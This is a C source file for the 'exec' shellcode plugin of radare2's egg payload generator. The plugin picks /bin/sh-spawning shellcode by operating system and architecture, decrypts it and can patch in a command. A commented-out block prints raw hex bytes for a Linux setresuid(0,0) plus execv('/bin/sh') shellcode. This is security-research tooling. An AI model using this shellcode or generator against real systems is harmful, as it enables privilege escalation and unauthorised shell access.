/* radare - LGPL - Copyright 2011-2025 - pancake */

#include <r_egg.h>
#include "sc/out/decrypt.inc.c"

#if 0
linux setresuid(0,0)+execv(/bin/sh)
31c031db31c999b0a4cd806a0b5851682f2f7368682f62696e89e35189e25389e1cd80

SETRESUID: (11 bytes)
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"

BINSH: (24 bytes) (x86-32/64):
"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
#endif

static const ut8 x86_osx_suid_binsh[] =
#include "sc/out/x86-osx-suidbinsh.c"
;

static const ut8 x86_osx_binsh[] =
#include "sc/out/x86-osx-binsh.c"
;

// linux
static const ut8 x86_linux_binsh[] =
#include "sc/out/x86-linux-binsh.c"
;

static const ut8 x86_64_linux_binsh[] =
#include "sc/out/x86_64-linux-binsh.c"
;

static const ut8 arm_linux_binsh[] =
#include "sc/out/arm-linux-binsh.c"
;

static const ut8 thumb_linux_binsh[] =
#include "sc/out/thumb-linux-binsh.c"
;


static RBuffer *build(REgg *egg) {
	RBuffer *buf = r_buf_new ();
	if (!buf) {
		return NULL;
	}
	const ut8 *sc = NULL;
	size_t sc_len = 0;
	int cd = 0;
	bool append_shellcode = true;
	char *opt_cmd = r_egg_option_get (egg, "cmd");
	char *suid = r_egg_option_get (egg, "suid");
	// TODO: last char must not be \x00 .. or what? :D
	if (suid && *suid == 'f') { // false
		free (suid);
		suid = NULL;
	}
	switch (egg->os) {
	case R_EGG_OS_OSX:
	case R_EGG_OS_DARWIN:
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			if (suid) {
				sc = x86_osx_suid_binsh;
				sc_len = sizeof (x86_osx_suid_binsh) - 1;
				cd = 7 + 36;
			} else {
				sc = x86_osx_binsh;
				sc_len = sizeof (x86_osx_binsh) - 1;
				cd = 36;
			}
		case R_SYS_ARCH_ARM:
			// TODO
			break;
		}
		break;
	case R_EGG_OS_LINUX:
		if (suid) {
			R_LOG_WARN ("no suid for this platform");
		}
		suid = 0;
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			switch (egg->bits) {
			case 32:
				sc = x86_linux_binsh;
				sc_len = sizeof (x86_linux_binsh) - 1;
				break;
			case 64:
				sc = x86_64_linux_binsh;
				sc_len = sizeof (x86_64_linux_binsh) - 1;
				append_shellcode = true;
				break;
			default:
				R_LOG_ERROR ("Unsupported arch %d bits", egg->bits);
			}
			break;
		case R_SYS_ARCH_ARM:
			switch (egg->bits) {
			case 16:
				sc = thumb_linux_binsh;
				sc_len = sizeof (thumb_linux_binsh) - 1;
				break;
			case 32:
				sc = arm_linux_binsh;
				sc_len = sizeof (arm_linux_binsh) - 1;
				break;
			default:
				R_LOG_ERROR ("Unsupported arch %d bits", egg->bits);
			}
			break;
		}
		break;
	default:
		R_LOG_ERROR ("Unsupported os %x", egg->os);
		break;
	}

	if (sc) {
		ut8 *dec = sc_decrypt (sc, sc_len);
		if (dec) {
			if (append_shellcode && R_STR_ISNOTEMPTY (opt_cmd)) {
#if 0
				int len = strlen (opt_cmd);
				if (len > sizeof (st64) - 1) {
					*opt_cmd = 0;
					R_LOG_ERROR ("Unsupported CMD length");
					break;
				}
				st64 b = 0;
				memcpy (&b, opt_cmd, strlen (opt_cmd));
				b = -b;
				opt_cmd = realloc (opt_cmd, sizeof (st64) + 1);
				if (!opt_cmd) {
					break;
				}
				r_str_ncpy (opt_cmd, (char *)&b, sizeof (st64));
				opt_cmd[sizeof (st64)] = 0;
				cd = 4;
				r_buf_write_at (buf, cd, (const ut8 *)opt_cmd, sizeof (st64));
#else
				R_LOG_WARN ("custom command for shellcodes is temporarily disabled");
#endif
			}
			r_buf_set_bytes (buf, dec, sc_len);
			free (dec);
			if (R_STR_ISNOTEMPTY (opt_cmd)) {
				if (cd) {
					r_buf_write_at (buf, cd, (const ut8 *)opt_cmd, strlen (opt_cmd) + 1);
				} else {
					R_LOG_WARN ("Cannot set opt_cmd");
				}
			}
		} else {
			R_LOG_ERROR ("Cannot pull opt_cmdcode");
			r_buf_free (buf);
			buf = NULL;
		}
	}
	free (suid);
	free (opt_cmd);
	return buf;
}

REggPlugin r_egg_plugin_exec = {
	.meta = {
		.name = "exec",
		.desc = "execute cmd=/bin/sh suid=false",
		.author = "pancake",
		.license = "MIT",
	},
	.type = R_EGG_PLUGIN_SHELLCODE,
	.build = (void *)build
};

#ifndef R2_PLUGIN_INCORE
R_API RLibStruct radare_plugin = {
	.type = R_LIB_TYPE_EGG,
	.data = &r_egg_plugin_exec,
	.version = R2_VERSION
};
#endif
